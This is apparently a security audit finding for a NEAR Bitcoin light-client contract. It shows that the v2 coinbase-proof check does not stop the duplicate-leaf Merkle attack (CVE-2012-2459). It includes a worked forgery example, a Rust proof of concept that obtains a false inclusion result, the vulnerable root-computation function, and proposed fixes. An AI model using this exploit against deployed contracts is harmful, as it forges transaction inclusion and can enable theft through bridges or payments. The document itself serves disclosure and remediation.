### Title
Duplicate-Leaf Phantom Index Bypasses v2 Coinbase-Proof Mitigation — (`contract/src/lib.rs`, `merkle-tools/src/lib.rs`)

---

### Summary

`verify_transaction_inclusion_v2` is intended to defeat the 64-byte internal-node forgery by requiring a same-length coinbase proof. However, the length-equality guard does **not** prevent the classic Bitcoin duplicate-leaf attack (CVE-2012-2459). For any odd-length block, an attacker who knows the real coinbase transaction and its valid Merkle proof can submit a proof for a phantom index (the duplicate of the last real leaf) and receive `true`, even though no transaction exists at that index.

---

### Finding Description

**Root cause — `compute_root_from_merkle_proof` accepts any `transaction_position` without bounding it to the actual transaction count.** [1](#0-0) 

The function takes `transaction_position` as a bare `usize` and uses it only to decide left/right placement at each level. It never checks whether the position is within the real leaf count of the block.

**The v2 guard in `verify_transaction_inclusion_v2`:** [2](#0-1) 

The only structural check added by v2 is:

```
args.merkle_proof.len() == args.coinbase_merkle_proof.len()
``` [3](#0-2) 

This was designed to block the 64-byte forgery (where an attacker submits a shorter proof for an internal node). It does **not** block the duplicate-leaf attack because the phantom position has exactly the same proof depth as the real last leaf.

**Concrete 3-transaction block walk-through:**

Block B contains `[tx0 (coinbase), tx1, tx2]`. Bitcoin's Merkle construction duplicates `tx2` to make an even layer:

```
Level 0:  tx0   tx1   tx2   tx2*   (* = phantom duplicate)
Level 1:  H(tx0,tx1)   H(tx2,tx2)
Level 2:  H(H(tx0,tx1), H(tx2,tx2))  = merkle_root
```

Proof depth for every leaf is **2**.

| Proof | tx_id | tx_index | proof[0] | proof[1] |
|---|---|---|---|---|
| Coinbase (real) | tx0 | 0 | tx1 | H(tx2,tx2) |
| Attacker's | tx2 | **3** | tx2 | H(tx0,tx1) |

Attacker's proof verification in `compute_root_from_merkle_proof(tx2, 3, [tx2, H(tx0,tx1)])`:
- Step 1: position 3 is odd → `H(tx2, tx2)` = `H12`
- Step 2: position 1 is odd → `H(H(tx0,tx1), H12)` = `merkle_root` ✓

All v2 guards pass:
1. `merkle_proof.len() (2) == coinbase_merkle_proof.len() (2)` ✓
2. Coinbase proof valid ✓
3. `verify_transaction_inclusion` computes the correct root for index 3 → returns `true` ✓ [4](#0-3) 

---

### Impact Explanation

Any caller (no special role required — `verify_transaction_inclusion_v2` is a public `view` call) can obtain a `true` inclusion proof for a transaction at a phantom index that does not correspond to any real transaction in the block. Downstream contracts or off-chain systems that rely on this return value to authorize asset releases, cross-chain bridges, or payment confirmations will accept a fabricated inclusion claim.

---

### Likelihood Explanation

The attack requires only:
1. Knowledge of a real odd-length block already stored in the light client (publicly observable on-chain).
2. The real coinbase txid and its Merkle proof for that block (derivable from any Bitcoin node or block explorer).
3. The txid of the last real transaction in the block (same source).

No privileged role, no key compromise, no social engineering. Any unprivileged NEAR account can call `verify_transaction_inclusion_v2` as a view call.

---

### Recommendation

Add an explicit upper-bound check on `tx_index` before accepting the proof. The block header does not store the transaction count, so the check must be enforced structurally:

**Option A — Reject even-position phantom indices:** After computing the root, additionally verify that `tx_index` is not a phantom duplicate by requiring `tx_index` to be strictly less than `2^(proof_depth)` **and** that the proof does not contain the tx_id itself as its own sibling at any level (i.e., detect self-sibling nodes in the proof path).

**Option B — Require the caller to supply the transaction count** and validate `tx_index < tx_count`, storing or committing to the tx count in the block header metadata at submission time.

**Option C — Detect the duplicate-leaf condition directly:** In `compute_root_from_merkle_proof`, or as a pre-check in `verify_transaction_inclusion_v2`, reject any proof where `proof[i] == current_hash` at any step (a self-sibling is the fingerprint of a duplicate-leaf position).

### Proof of Concept

```rust
// 3-tx block: [coinbase, tx1, tx2]
// Merkle tree (Bitcoin duplicate-last-leaf rule):
//   Level 0: coinbase, tx1, tx2, tx2
//   Level 1: H(coinbase,tx1), H(tx2,tx2)
//   Level 2: H(H(coinbase,tx1), H(tx2,tx2)) = root

let h_tx0_tx1 = compute_hash(&coinbase, &tx1);
let h_tx2_tx2 = compute_hash(&tx2, &tx2);
// root = compute_hash(&h_tx0_tx1, &h_tx2_tx2)

// Valid coinbase proof (index 0, depth 2):
let coinbase_merkle_proof = vec![tx1.clone(), h_tx2_tx2.clone()];

// Attacker's proof for phantom index 3 (tx2 duplicate), depth 2:
let attacker_merkle_proof = vec![tx2.clone(), h_tx0_tx1.clone()];

// Both proofs have length 2 → length-equality check passes.
// Coinbase proof is valid → coinbase check passes.
// Attacker's proof for index 3 also produces the correct root → returns true.

let result: bool = user_account
    .view(contract.id(), "verify_transaction_inclusion_v2")
    .args_borsh(ProofArgsV2 {
        tx_id: tx2.clone(),           // last real tx
        tx_block_blockhash: block_hash,
        tx_index: 3,                  // phantom duplicate position
        merkle_proof: attacker_merkle_proof,
        coinbase_tx_id: coinbase.clone(),
        coinbase_merkle_proof,
        confirmations: 0,
    })
    .await?
    .json()?;

assert!(result); // true — false inclusion accepted despite v2 mitigation
```

#[must_use]
pub fn compute_root_from_merkle_proof(
    transaction_hash: H256,
    transaction_position: usize,
    merkle_proof: &Vec<H256>,
) -> H256 {
    let mut current_hash = transaction_hash;
    let mut current_position = transaction_position;

    for proof_hash in merkle_proof {
        if current_position % 2 == 0 {
            current_hash = compute_hash(&current_hash, proof_hash);
        } else {
            current_hash = compute_hash(proof_hash, &current_hash);
        }
        current_position /= 2;
    }

    current_hash
}
